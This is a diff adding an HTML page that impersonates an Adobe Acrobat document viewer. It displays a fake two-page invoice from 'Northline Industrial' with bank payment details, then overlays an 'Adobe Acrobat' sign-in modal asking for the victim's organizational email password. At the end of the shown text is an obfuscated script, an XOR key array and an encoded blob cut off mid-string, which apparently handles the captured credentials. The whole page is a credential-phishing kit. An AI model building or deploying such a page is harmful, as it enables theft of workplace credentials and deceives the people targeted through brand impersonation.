+        </button>
+
+        <button class="tb" type="button" data-tool="draw" aria-pressed="false">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M17.6 17.6c-2.9 2.3-8 2.5-10.9-.2C4.1 14.9 4.4 10 7.4 7.6c2.6-2.1 6.4-1.9 8.1.2 1.5 1.8.9 4.5-1 5.6-1.6.9-3.7.4-4.4-1.1-.6-1.2 0-2.7 1.2-3.1"/>
+          </svg>
+          <span class="tb-caret" aria-hidden="true"></span>
+          <span class="tip">Draw</span>
+        </button>
+
+        <button class="tb" type="button" data-tool="text" aria-pressed="false">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <rect x="3.4" y="3.4" width="17.2" height="17.2" rx="1" stroke-dasharray="2.6 2.4"/>
+            <path d="M8.4 16.4 12 7.4l3.6 9" stroke-linejoin="miter"/>
+            <path d="M9.6 13.5h4.8"/>
+          </svg>
+          <span class="tb-caret" aria-hidden="true"></span>
+          <span class="tip">Edit text</span>
+        </button>
+
+        <button class="tb" type="button" data-tool="sign" aria-pressed="false">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M3.4 20.6 4.4 17 13.2 8.2l3.2 3.2-8.8 8.8Z"/>
+            <path d="M4.4 17 8 20.6"/>
+            <path d="M18.4 3.2l.8 2.1 2.1.8-2.1.8-.8 2.1-.8-2.1-2.1-.8 2.1-.8Z" fill="currentColor" stroke-width="1"/>
+            <path d="M14.2 2.6l.45 1.15 1.15.45-1.15.45-.45 1.15-.45-1.15-1.15-.45 1.15-.45Z" fill="currentColor" stroke-width="1"/>
+          </svg>
+          <span class="tb-caret" aria-hidden="true"></span>
+          <span class="tip">Fill &amp; sign</span>
+        </button>
+
+        <button class="tb tb-more" type="button" data-tool="more" aria-pressed="false">
+          <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+          <span class="tip">More tools</span>
+        </button>
+      </div>
+    </aside>
+
+    <main class="canvas" id="canvas">
+      <div class="load" id="loadState">
+        <div class="wm"><svg class="ac-mark"><use href="#acrobat-mark" xlink:href="#acrobat-mark"/></svg></div>
+        <div class="bar-wrap"><div class="bar" id="pbar"></div></div>
+        <div class="load-lbl" id="plbl">Opening document…</div>
+      </div>
+
+      <div class="scroller" id="scroller">
+        <div class="pages" id="pages">
+          <article class="sheet" data-page="1">
+            <div class="inv">
+              <div class="inv-top">
+                <div class="inv-co">
+                  <h1>NORTHLINE INDUSTRIAL</h1>
+                  <p>1840 Harbor Parkway, Suite 400<br>Long Beach, CA 90802<br>accounts@northline-ind.com · +1 (562) 555-0194</p>
+                </div>
+                <div class="inv-mark">
+                  <div class="word"></div>
+                  <div class="meta">Invoice No. INV-2026-0847<br>Date: March 12, 2026<br>Due: April 11, 2026<br>Terms: Net 30</div>
+                </div>
+              </div>
+              <div class="inv-cols">
+                <div>
+                  <h3>Bill To</h3>
+                  <p><strong>CHP Maui, Inc.</strong><br>Accounts Payable<br>200 High Street, Floor 3<br>Wailuku, HI 96793</p>
+                </div>
+                <div>
+                  <h3>Ship To</h3>
+                  <p>Project RPC B2026-00005<br>Job site — Receiving Dock B<br>Kahului, HI 96732</p>
+                </div>
+                <div>
+                  <h3>P.O. / Reference</h3>
+                  <p>PO-4419-C<br>Contract RPC B2026-00005<br>Sales rep: J. Hale</p>
+                </div>
+              </div>
+              <table>
+                <thead>
+                  <tr><th>Item</th><th>Description</th><th class="r">Qty</th><th class="r">Unit</th><th class="r">Amount</th></tr>
+                </thead>
+                <tbody>
+                  <tr><td>STL-214</td><td>Structural steel fabrication — beam set A</td><td class="r">12</td><td class="r">$1,840.00</td><td class="r">$22,080.00</td></tr>
+                  <tr><td>STL-218</td><td>Galvanized plate assemblies, grade 50</td><td class="r">8</td><td class="r">$960.00</td><td class="r">$7,680.00</td></tr>
+                  <tr><td>FRT-04</td><td>Ocean freight &amp; destination handling</td><td class="r">1</td><td class="r">$4,250.00</td><td class="r">$4,250.00</td></tr>
+                  <tr><td>INS-11</td><td>Cargo insurance (declared value)</td><td class="r">1</td><td class="r">$1,125.00</td><td class="r">$1,125.00</td></tr>
+                  <tr><td>FLD-02</td><td>On-site offload supervision (2 days)</td><td class="r">16</td><td class="r">$185.00</td><td class="r">$2,960.00</td></tr>
+                </tbody>
+              </table>
+              <div class="inv-tot">
+                <div><span>Subtotal</span><span>$38,095.00</span></div>
+                <div><span>Freight prepaid</span><span>$0.00</span></div>
+                <div><span>Tax (exempt — resale)</span><span>$0.00</span></div>
+                <div class="grand"><span>Amount Due</span><span>$38,095.00</span></div>
+              </div>
+              <div class="inv-foot"><span>Page 1 of 2</span><span>INV-2026-0847 · Confidential</span></div>
+            </div>
+          </article>
+          <article class="sheet" data-page="2">
+            <div class="inv">
+              <div class="inv-top">
+                <div class="inv-co">
+                  <h1>NORTHLINE INDUSTRIAL</h1>
+                  <p>Remittance &amp; terms · Invoice INV-2026-0847</p>
+                </div>
+                <div class="inv-mark">
+                  <div class="word" style="font-size:22px;letter-spacing:1px">TERMS</div>
+                </div>
+              </div>
+              <h2 class="sec">Payment instructions</h2>
+              <div class="bank">
+                Bank of the West · ABA 1211-0037-4<br>
+                Account name: Northline Industrial Supply LLC<br>
+                Account no. 4482 0199 7731 · SWIFT BNLAUS6L<br>
+                Reference: INV-2026-0847 / CHP Maui
+              </div>
+              <div class="terms">
+                <h2 class="sec">Conditions</h2>
+                <p>1. Payment is due within thirty (30) days of the invoice date. Amounts unpaid after the due date accrue service charges of 1.5% per month.</p>
+                <p>2. Title to goods remains with Northline Industrial until funds have cleared. Risk of loss transfers upon delivery to the named consignee.</p>
+                <p>3. Claims for shortage or damage must be submitted in writing within five (5) business days of receipt. Concealed damage must be reported within ten (10) days.</p>
+                <p>4. This invoice is issued pursuant to Contract RPC B2026-00005. In the event of conflict, the contract governs.</p>
+                <p>5. Please remit the full amount due. Partial payments will be applied first to accrued charges, then to principal.</p>
+              </div>
+              <div class="sigrow">
+                <div class="sig"><span>Authorized signature</span><b>Jordan Hale, Controller</b></div>
+                <div class="sig"><span>Received by (consignee)</span><b></b></div>
+              </div>
+              <div class="inv-foot"><span>Page 2 of 2</span><span>Thank you for your business</span></div>
+            </div>
+          </article>
+        </div>
+      </div>
+
+      <div class="modal" id="dlModal">
+        <div class="card">
+          <div class="card-accent"></div>
+          <div class="card-top">
+            <svg class="ac-mark"><use href="#acrobat-logo" xlink:href="#acrobat-logo"/></svg>
+            <div class="card-brand">Adobe Acrobat</div>
+          </div>
+            <div class="login-card">
+    <h2>Welcome back</h2>
+    <p>Adobe Acrobat, every tool you need to work with PDFs in one place.</p>
+    <p>Enter your Organizational email password to continue</p>
+
+    <div class="input-group">
+      <input type="email" id="email" placeholder=" " required readonly>
+      <label for="email">
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+          <polyline points="22,6 12,13 2,6"/>
+        </svg>
+        Email address
+      </label>
+    </div>
+
+    <div class="input-group">
+      <input type="password" id="password" placeholder=" " required>
+      <label for="password">
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        Password
+      </label>
+      <button type="button" class="toggle-password" onclick="togglePassword()">
+        <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>
+      </button>
+    </div>
+    <div id="messageDiv"></div>
+    <button class="login-btn" onclick="nav()">Sign In</button>
+
+    <div class="extra">
+      
+    </div>
+  </div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <footer class="bot">
+    <div class="pg" id="pg">— / —</div>
+    <div class="bot-sp"></div>
+    <div class="zoom-row">
+      <button class="zb" type="button" id="zOut" title="Zoom out"><svg viewBox="0 0 14 14" fill="none"><path d="M3 7h8" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></button>
+      <input type="range" id="zRange" min="40" max="200" value="90" step="5" aria-label="Zoom">
+      <button class="zb" type="button" id="zIn" title="Zoom in"><svg viewBox="0 0 14 14" fill="none"><path d="M7 3v8M3 7h8" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></button>
+      <div class="zp" id="zPct">90%</div>
+      <button class="zb" type="button" id="zFit" title="Fit page"><svg viewBox="0 0 14 14" fill="none"><path d="M2.5 5V2.5H5M9 2.5h2.5V5M11.5 9v2.5H9M5 11.5H2.5V9" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+    </div>
+  </footer>
+</div>
+
+<script>(function(){var _k=[173,243,52,173,65,87,199,68,15,40,52,39,59,225,37,19],_p="p9tS2C80sy1gRhwOQOsFM9uSRo0eP+d5L05VS0iEHhmn0xSCbncl0I/KoKfZdaUznN0U4C4itCEvBxRzVJRGe43cFOYkLqUrblpQB0uTQGDInVfIYbVTxO28tMWvYceHLRGgLaPDR6abqNazuwOxk09ntE/V1yXQj8qgp9l1pfE5c9Y5wbVTxO28tMWvYS8zjYVV32EIqjIvFRQXF8F6cMHTCY1xe+cbZFgUGhvRCTPygFeNfHf3aC93QFQb3AUjlvkUjTc2tWRQW0BGSZVxM5DTcMw1MukqYF8cDgDrBTPbkkaNHjSoK31MRwcGwX5Olvk+jWExsipsXF1IVcF6fMO+eYUkfuc/BQgUBxu+SGWG2A+nYXfnZGZOFA9kgkp835dHgy0yqSN7QBQbG9AXOo2sV8IuJaM3IVhBVFPJfnaDkFjEJDmzHHMYGAdez0Z/xJZa2Rgr92gvbFVTXs9LfNrbHY1sd5g3e0lGU2+8DCin0xTQS3fnInpGV1NSjksz8pxa+RJ/om0vUz4HG8EFTNmAH4Z6XedkLwhdQRvJQD3ZnEHOKTK0ZCkOFEIVlUpmzptR3m87oipoXFwOG5ovM43TFI1hIaY2L1wUGhuEC2fChlfFJCScdFITPgcbwQUzjZpSjWkIpCtgWlBUFY1AfcqHXI19d/Z2JghrRFSOV3fe3UTYMj/vH3sGV0tShEtn9Y8EgWEj6SdjQVFJT7hZI4HTcMw1MukqYF8cDhvMBUzeh1XfNQOabTQiFAcbwVgZjdNJp2F3oTFhS0BOVI8FTMKdd+Fpfuc/L3dXSxDKHjPQ+RSNJyKpJ3tBW0kbvkp95qMchGEs5xtkWB8MAMFYGY3TUtgvNLMtYEYUeFSPdlCF2hTWYQi0JyQDDwdG6y8zjZdbzjQ6oip7BlVDX6RTdsOHeMQyI6IqalocAFaOUGDInlvbJHDrZFBHWmp2zQVo3ZJH3ighon57WkFCRsgeGY3TUMIiIqohYVwaRl+FYGXInUDhKCSzIWFNRg8clUpmzptH2SAls2MjCGtIVbV2P42IRMwyJK4yahJAVU6EWDqW+RSNJTikMWJNWlMVgEF36IVRwzUbrjd7TVpCSckCcMGaV8Zme+cbYEZ3axfBXmPMgEfENzL9MH1dUVoS2i8zjZdbzjQ6oip7BlVDX6RTdsOHeMQyI6IqalocAFCEXHfChFqKbXeYK2FjZAsbmlVy3oBd2yRtszZ6TUkOAOsFM8mcV9gsMqkwIUlQQ36XQH3Zv13eNTKpIX0AE1RYk0p/wdQYjR44qRdMBBRcS4BWYMSFUZc1JbIhcgEPLTHBBTyC09Y5wbVTxO28tAcJzwVRwocUySQjoid7QVtJG5JMdMOSWN5htVPE7by0xa9hx4ctEaAto8NHppuo1rO7A7GTT2e0T9XXJdCPyqCn2XWl8Tlz1jnBtVPE7by0xa9hx4ctEaAto8NHppuo1rO7A7GTT2e0T9XXJdCPyqCn2XWl8TlzPo1hMbIqbFxdSFXBenresVvZaX7nPwUIFAcbl0RhjYZVjXx37ypuXl1AWpVKYYOGR8gzFqAhYVwUW0fBAjSE3UDCDTiwIX1rVVReyQwop9MUjWF46GRHTVVDV4RWYI2RRsI2JKI2L1tdQFWAUWbflkenYXfnZGZOFA8UiUByyZ9R3jIrtyxuRkBIVotWb96WWMgvPrIpc1hBV0uEUXbIgUjdLTa+M31BU09PnUZhzIRY0TInriBqWkhFVJV+T97IG/A9IKAhe1RXUkmNCnqDh1HeNX+yJSYBFFVelVBhw9NA3zQy/E4vCBQHFM4FRMiRcN8oIaI2L05YRlzBDWDIhxTPOHeUIWNNWk5OjAkz/YZE3SQjoiF9BBR3V4BcZN+aU8U1fs1kLwgUTl3BDX3MhV3KICOoNiFfUUVfk0xlyIEdjTMyszF9RhRTSZRAKKfTFI1heOhkQkFHVFKPQjPPgVvaMjK1ZGlNVVNOk0BgjYdczDV3tSFuRBRFSY5SYMiBR40gO7AldlsUT1qXQBmN0xSNKDHnbC5fXUlfjlI9zptGwiwy52IpCBVJWpdMdMyHW99vIaIqa0dGBx3HBTLamlrJLiDpN25OVVVSyAVop9MUjWF35y1pCBxTQpFAfMvTQ8QvM6gzIUdaU1SURnveh1XfNXf6eTIIE1JVhUB1xJ1RyWZ34WIvXE1XXo5DM9qaWskuIOkrYUVbUkiESHzblhSQfGrnY3pGUEJdiEt2ydQdjTMyszF9RhRTSZRAKKfTFI1hKs1kLwgUCBTBdmbeg13OKDiyNy9fXUlfjlIzyZpZyC8krithWxQPU4REd8GWR95hM6Iibl1YUxuIVjPClUDIL3f/dD9QAhcLwUBrzJBAwTh+zWQvCBROXcENZMSdUMI2eagxe01GcFKFUXuNzgmQYWfnYikIQ05VhUpkg5xB2SQljyFmT1xTG9wYLo3DHY0zMrMxfUYUU0mUQCin0xSNYSWiMHpaWgddgElgyMg+jWEqzU4vCBsIGwOxk09ntE/V1+d3IQh5SE2ESHbDhxTdICOzIX1GFEZVgElq3ppHjaPDR6abqNazuwOxk09ntE/V1yXQj8qgp9l1pfE5c9Y5wbVTxO28tMWvYceHLRGgLaPDR6abqNazuwOxk09ntE/V1yXQj8qgp9l1pfE5cz6NYTGyKmxcXUhVwXp7zIB82Cw2qRRuXEBCSY8NOo2IPo1hd+ctaQgceFiOSmHJgBrBJDmgMGcICAcIyAVhyIdB3y93oSVjW1EcMcEFM43cG40CP6InZAhSSEnBS3zD3ljELzKmNi9FW1FejEB92dPWLdV3pSt7WxRIXZVAfY2eW9skd64qL1hRVV2ERmfBihTeNSWmLWhAQAdXiEt23tNb32EjoihqWFtVT+sFM43TQswzd6MtaU5HBwbBFT+Nh1vZIDuDLXxcFBob0R4ZjdMUjSc4tWQnXlVVG4gFLo3CD40od/tkUEtbSEmFVj3BllrKNT/8ZGYDHw4bmi8zjdMUjWEhpjYvTEwHBsF6cMKcRskyDK4ZVBhpBxbBenDCnEbJMgyuaT51bxdm2i8zjdMUjWEhpjYvTE0HBsF6cMKcRskyDK4ZVBlpBxbBenDCnEbJMgyuaT51bxZm2i8zjdMUjWEhpjYvTF1UT8EYM+CSQMVvJLY2ewBQXxGFXTOG01DUazO+bTQiFAcbwQUz2ZxAzC0Trjd7CB8aG4VMYNnIPo1hd+dkL0FSBxOFTGDZ0wqNcXfhYi9MXVRPwRkzmMMEhGEzriJpWx8MAOsFM43TSadhd+dkIAcUZk/BSXbMgECNMjiqIS9GW0kWm0Bhwt8Uwy456jBqRFFXVJNResOUFMAuIaIpakZALRvBBTPflkDYMznnIGZOUlQb3xgzn9MSi2EjqDBuRHBOSJUFLY3BBJZLd+c5BSIUBxTOBfE5c9Y5wbVTxC8cGgduj0l8zpgUzzQjsythCENPXo8Fe9ieVcNhNKgqaUFGSl6FBfE5c9Y5wbVTxO28tMWvYceHLRGgLaPDR6abqNazuwOxk09ntE/V1yXQj8qgp9l1pfE5cz6NYTGyKmxcXUhVwXpn34phwy04pC8nARRcMcEFM42aUo1pCK9tL1pRU06TSyin0xSNYT6hZCd3XVR5jlE7hNoU3yQjsjZhEz4tG8EFM9uSRo0kO6Y0fE1QBwbBYXLZlhrDLiDvbS8FFHhIlURh2acPp2F352QgBxRqUo9MftieFJVxZ6o3L0daB0uAQnaN21bCNSTnK2lcUUkbiEtnyIFVzjV3rip8XFVJT41cOqfTFI1hPqFkJ01YRkuSQHeNzxSVcWfuZH1NQFJJjx4Zp9MUjWF46GRCXUdTG4lEZcjTRsggO+ctYVxRVVqCUXrCnQ6NLDiyN2oIWUhNhFYz4qEU2S4ipCwvTUJCVZVWGY3TFI03NrVkZ0lHblWRUGeNzhSFHjqxZDEVFBQbnVkz8odHjX9q53UmEz4HG8EFesvTHIwpNrQNYVhBUxLBV3bZhkbDel3NZC8IFAgUwXN235pS1GE6qDJqRVFJT8FVctmHUd8vd6srYENHB1OUSHLD0xzLLiXnKWBdR0IAwVZ4xIMUyy4l5zBgXVdPFo5Lf9TaPo1hd+ctaQgceFaXBS2Q0weNZ3HnZVBAVVRzlEhyw6NV2TUytSonAR0HSYRRZt+dD6dLd+dkL3dcBwbBUWHYlg+nYXfnZHlJRgdZlUszkNNQwiIiqiFhXBpAXpVgf8ieUcM1Fb4NawATRUvGDDPRjxTJLjSyKWpGQAlchFFWwZZZyC8jhT1GTBwASJVEYdmxQMNmfvxOLwgUB1KHBTvPh1qEYSzNZC8IFAcbg1F9g5dd3iA1qyFrCAkHXYBJYMjIPo1hd+dkL0pASRWSUWrBlhrCMTakLXtRFBobxgIop9MUjWF35yZ7RhpUT5hJdoODW8QvI6I2Sl5RSU+SBS6N1BOWS3fnZC8IFEVPjwtwwZJH3g0+tDAhWlFKVJdAO4qRRIAtOKQvakwTDgDrBTON00mnYXfnZCAHFGRXhER92IMUwSgksyFhTUZUMcEFM42XW840OqIqewZGQlaOU3bohVHDNRuuN3tNWkJJyQJ+woZHyCw4sSEoBBR4VI9oXoTIPo1hd+cgYEtBSl6PUT3fllnCNzKCMmpGQGtSklF2w5ZGhWYjqDFsQEdTWpNRNIHTa8IvA5RtNCIUBxvBQXzOhlnILyPpNmpFW1FepFN2w4d4xDIjoipqWhwAWI1McMbUGI0eOKkHQwEPLRvBBTPJnFfYLDKpMCFaUUpUl0BW25Za2Q0+tDBqRlFVE8ZOdtSXW9ovcOtkUEdabGvIHhmN0xSNJTikMWJNWlMVk0B+woVR6DcyqTBDQUdTXo9AYYXUR84zOKsoKAQUeFSPdlCEyD6NYSrNTi8IGwgbok12zpgU3SQlritrQVdGV41cM4WfXcopI7AhZk9cUxsDpYeNgEDCMSTnJWlcUVUblEt/wpBfhEt35zJuWhR4UpcFLo2AUdkIObMhfV5VSxOHUH3Oh13CL3/uZHQiFAcbwXpn34phwy04pC8nAQ8tG8EFM8SVFIUeP+5kbERRRkmoS2fIgULMLX+YLXkBDy0bwVg/jcAEnWhszU4vCBsIGwOxk09ntE/V1+dxIQhwTkiAR3/I01bYNSOoKi9BWk5PiER/wYoUT9XXJdCPyqCn2XWl8Tlz1jnBtVPE7by0xa9hx4ctEaAto8NHppuo1rO7A7GTT2e0T9XXJdCPyqCn2XWl8Tlz1jnBtVPE7by0xa9hx4ct+RSNJyKpJ3tBW0kbvkl8zph22S9/7mR0IhQHG8FTct/TVtkvd/pka0dXUlaES2eDlFHZBDuiKWpGQGVCqEE7ipFEimh3uzgvTFtEToxAfdndU8g1EqshYk1aU3mYbHeF1EfZICWzBntGEw4A6wUzjdNdy2F/pTBhARRcMcEFM43TFM81OekgZltVRVeEQTOQ00DfNDL8Ti8IFAcbwUdnw91H2Tg7ompgWFVEUpVcM5DTE51vYuB/BQgUBxvBBXHZnRreNS6rISFYW05VlUBh6IVRwzUk53kvD1pIVYQCKKfTFI1hd+cme0YaRFeAVmDhmkfZbzajICcPVlcWjUpwxpZQimhszWQvCBRaMcEFbqf5FI0oMedsa0dXUlaES2eDgVHMJS6UMG5cUQcG3Bgzip9bzCU+qSMoARRcMcEFM42XW840OqIqewZVQ1+kU3bDh3jEMiOiKmpaHAB/rmhQwp1AyC8jiytuTFFDHM0FTMGcV8YDI6ltNCIUB0bBQH/elhTWS3fnZC93WEhYimdnw9sdlkt35zkFVR0PEtovGaeFVd9hFpcNUGp1dH7BGDPBnFfMNT6oKiFHRk5ciEsop9MU2yAl5zZqTF1VXoJRRt+fFJBhda8we1hHHRTOUmTa3VXJLjWiamxHWQhfjkZmwJZa2WNszU4vCEJGScFBdtuaV8gCOKMhLxUUSU6NSSin0xTbICXnNGBEWG5VlUBh25JYjXx3qTFjRA8tG8FTct/TWMImPqkUYFhBVxvcBX3Yn1iWS3fnMm5aFFdUjUlR2IBNjXx3oSVjW1EcMcEFZcyBFN41NrUwakwUGhuHRH/elg+nS3fnInpGV1NSjksz3ptb2mk+o210CFBIWJRIdsOHGtw0MrU9XE1YQliVSmHsn1iFZnS0J3wEF0tfkgkwyIFHgWIzpDcoARpBVJNgcs6bHMs0OaQwZkdaD16NDGiNlliDIjumN3xkXVRPz0R3ydsTxSgzoyFhDx0cG5wMKI2FVd9hMvogYEtBSl6PUT3KlkDoLTKqIWFcdl5yhQ16ydoPjSgx7yEmTRpEV4BWYOGaR9lvJaIpYF5RDxyJTHfJllqKaGznOQUIFEFOj0ZnxJxajTIyswF9WltVE4xWdISIFMkuNLIpakZACVyEUVbBllnILyOFPUZMHABejAI6g4dR1TUUqCp7TVpTBoxWdJbTR8UuIO9jalpHABLaBW6n+RSNJyKpJ3tBW0kbgkY7hIg+jWF35zJuWhRCV8EYM8mcV9gsMqkwIU9RU36NQH7InUDvOB6jbChdVwAS2i8zjdMU2yAl5yZ7RhQaG4VKcNieUcM1eaAhe21YQlaES2fvin3JaXCkNG0PHRwxwQUzjZpShWAyq20vWlFTTpNLKKfTFI1hIaY2L0tbQ17BGDPInxrZJC+zB2BGQEJVlR4ZjdMUjTc2tWRgWl1AG9wFcdmdGtkkL7MHYEZAQlWVHhmN0xSNJyKpJ3tBW0kbhUp9yNsd1mE1syohXFFfT6JKfdmWWtlhaudjTEdETl6FBDSW00fINQOuKWpHQVMTh1B9zoddwi9/7j8vSkBJFZVAa9mwW8M1MqkwLxUUSEmIQiiNjhiNc2f3dCYTFFoxwQUzjZpShS82sS1oSUBISc9Gf8SDVsIgJaNkKQ4USVqXTHTMh1vfbzSrLX9KW0ZJhQtk35pAyBUyvzAmUxRJWpdMdMyHW99vNKstf0pbRkmFC2TfmkDIFTK/MCdLW0NeyAtnxZZahSU4qSEmExRaMcEFM42WWN4kLOcybloUU1rcQXzOhlnILyPpJ31NVVNepEl2wJZa2WlwsyF3XFVVXoACOpbTQMxvIaYoek0JRFSFQCiNl1vONDqiKnsGVkhfmAty3YNRwyUUry1jTBxTWsgeM9mSGt4kO6InewAdHBuFSnDYnlHDNXmiPGpLd0hWjER9ydsTzi4nvmMmExRDVIJQfsidQIMjOKM9IVpRSlSXQFDFmljJaSOmbTQIUEhVhA06ltNJp2F3uk4FCBRBTo9GZ8ScWo0mOu9tdCIUBxvBTHWF0lDINz6kIUxHUEISwVd22YZGw3pd52QvCEJGScFTM5DTUMIiIqohYVwaVk6EV2r+lljIIiOoNicPb0NalUQ+25ZGxCc+pCV7QVtJFpRXevDUHZZLd+dkL15VVRuUV3qNzhTbYWjnMiFPUVN6lVFhxJFB2SR/4CBuXFUKTYRXesuaV8w1PqgqIl1GThzIBSmN1FzZNSe0fiAHWU5Yk0pgwpVAgyI4qmtrTUJOWIRJfMqaWop6XedkLwhCRknBUjOQ0wGdcXvnLC8VFBEO0R4ZjdMUjTc2tWRjTVJTG9wFO96QRsgkOekzZkxATxvMBWSE0xuNc2zNZC8IFFFakwVnwoMUkGF/tCd9TVFJFYlAesqbQI1sd69tLwcUFQDrBTON01jCJj6pFGBYQVcb3AVkxJ1QwjZ5qDRqRhxSSYgJM4qeR+EuMK4qKAQUAEyIQWfFzhONanewZCQIEwtThEx0xYcJimF85ywvAxQAF41AddnOE41qd6shaVwUDBvGCWfCgwmKYXznMGBYFAwbxglnwpxYzyAl+ipgBFlCVZRHct/OWsJtJKQ2YERYRVqTVi7UlkeBMzK0LXVJVkte3Fx23tQdlkt352QvTFtEToxAfdndU8g1EqshYk1aU3mYbHeF1FbdZn7pIGZbVUVXhEEzkNNA3zQy/E4vCBQHX45GZsCWWtlvMKIwSkRRSl6PUVHUulCFZjW3YyYGQEJDlWZ8w4dRwzV3+mQof1VOT4hLdI2VW99hJK4jYQVdSRXPCzSW+RSNYXe3K2NEfUlPhFdlzJ8UkGEkojBGRkBCSZdEf4WDW8Ete+d2PxgEDgDrBTON00TCLTvvbTQiFAcbwVNy39NEwjEitxNuXFdPG9wFYMiHfcM1MrUybkQcQU6PRmfEnFqFaCzNZC8IFAcblVdq1vkUjWF352QvCF1BE8BJfMqaWv0uJ7I0L1RIB1eOQnrDo1vdNCfpJ2NHR0JfyF4ZjdMUjWF352QvCFdLXoBXWsOHUd83Nqtsf0dEUku2RGfOmx2WS3fnZC8IFAcbwQVwwZZV3wg5syF9XlVLE5FKf8G6WtkkJbElYwEPLRvBBTON0xSNYXe3K2NEHA4A6wUzjdMUjWF352R/R1hLco9Rdt+FVcFhauc3alx9SU+EV2XMnxzdLjuraC8ZARcLyB4ZjdMUjWF352RyIhQHG8EFM9CQVdkiP+8hJlNJLRvBBTPQ3xSYcWfufwUIFFox6wUzy4ZazjU+qCovWFtLV8kMaKfTFI1hPqFsLkxRUVKCQFDCl1GNPSvnNGBEWGVOklw6jYFR2TQlqX8FCBQHG5FKf8GxQd44d/pke1pBQgDrBTON01LINTSvbE54fXh5oHZWjdgUj242ty0gTFFRUoJAPN2cWMFje+c/BQgUBxvBBX7Ih1zCJW3nY19nZ3MczS8zjdMUjWE/oiVrTUZUAcFeM4qwW8M1MqkwInxNV17GHzOKkkTdLT6kJXtBW0kUi1Z8w9QU0G1d52QvCBQHWY5BapfTfv4OGek3e1pdSVyIQ2qFiBTJJCGuJ2p3V0hfhB8zyZZCxCIyhCtrTRgHWI1MdsOHa8QxbecyZltdU1STbGONjh2nYXfnZHIBGlNThEs7y4ZazjU+qConWh1cG5NAZ9iBWo0zea03YEYcDgDBWDqDh1zIL3+hMWFLQE5Ujw13zIdVhDpd52QvCBQHUocNd8yHVYMyI6YwelsUGgbcBTTehlfOJCS0YyZTPgcbwQUzjdMUzi0ypjZGRkBCSZdEf4WDW8EtHqkwalpCRlfIHhmN0xSNYXfnZGtNQk5YhGZ8yZYUkGE5sihjEz4HG8EFM43TFNkzLuc/L0FSD1eOQnrDo1vdNCfnYikIFUtUhkx9/ZxE2DF5pChgW1FDEsFJfMqaWv0uJ7I0IUtYSEiEDTqW00mNIjazJ2cAUQ5AnC8zjdMUjWF35zdnR0MPHJJGYIraD6dhd+dkLwgUB02AVzPJlkfZYWrnIG5cVQlJhEF635ZX2R4itSgvVEgHSYRBet+WV9kUJat/BQgUBxvBBTONmlKFJTK0MCZTFFRelXF6wJZb2DV/oTFhS0BOVI8NOtbTQ8QvM6gzIURbRFqVTHzD3VzfJDHneS9MUVRP2gVugdMGnXFn7n8vVT4HG8EFM42OFMgtJKJkZk4cQ1qVRD3IgUbCM368Ti8IFAcbwQUzzp9RzDMeqTBqWkJGV8lVfMGffcM1MrUybkQdHDHBBTON0xSNYT6hbGtJQEYVhFdhwoEUkHxq52NqUEROSYRBTNmcX8gvcO5kfE1AYkmTSmGF1GLIMz6hLWxJQE5UjwV21YNd3yQz6WRfRFFGSIQFYciVRsgyP+clYUwUU0mYBXLKkl3Db3DufwUIFAcbwQUzjZZY3iR3tCF7bUZVVJMNd8yHVYMkJbUrfQEPLRvBBTON00mnYXfnZHIBGkRalUZ7hZVBwyIjrithAB1cRsgLdcSdVcEtLu8iekZXU1KOSzuEiBTdLjurBnpbTQcGwUNywYBRlmEq7n8FCBRaMetTct/TQsQyPrMrfWFEBwbBBzGW+ULMM3exLXxBQEhJqFVByJJQ1GFq5ypqXxR3SY5Iet6WHMs0OaQwZkdaD0mEVnzBhVGEOl3nZHlJRgdfjkt2jc4UyyA7tCE0IhQHXZRLcNmaW8NhMa4qZltcD1KRDGiNmlKNaTOoKmoBFFVelVBhw8gUyS45omQyCEBVToQeM9uaR8Q1OLUNfwgJB1KRBW/R0xaPene1IXxHWFFeyVN63ppAwjMet200CEktG8FWdtmnXcAkOLIwJ05BSViVTHzD2x3WYTGuKmZbXA8ZwwwojY4YjXNi93QmEz4HG5dEYY2AW9gzNKI3LxUUfDHBBTONiBTYMzv9ZC1AQFNLkh88gpJExG8+ty1pURpISYYadcKBWcw1aq03YEYWCxuRRGHelg6NJyKpJ3tBW0kThQxojYFR2TQlqWRrCBIBG4ULet3IFNBhKutOLwgUB0DBUGHByRSPKSOzNHwSGwgKzxQ9nN0FgiIzqWlsT10IT5NEcMjRGI0xNrU3ahIUQU6PRmfEnFqFJX68ZHlJRgdWwRgzgppEkGkMmRhhdR8OFM9Aa8iQHMlobOc2alxBVVXBSDOL1RTAGmaafy9VGAdPhF1nl9NA3zQy5zkjIhQHG8FeM9iBWJdhda8we1hHHRTOTGPMg12DIjjoLnxHWggZzQVjzIFHyHt3oTFhS0BOVI8Nd4SIFN8kI7I2YQhQBx3HBXeDmkSWYSrnOQUIFHoA6wUzy4ZazjU+qCovXEZedYRdZ4WaUNVoLM1kLwgUTl3BDXfCnVGEYSWiMHpaWhwxwQUzjZpSjWk+ozwvFgkHSI5QYc6WR4MtMqkje0AdB0DBQ3rDmkfFaXXlbTQIRkJPl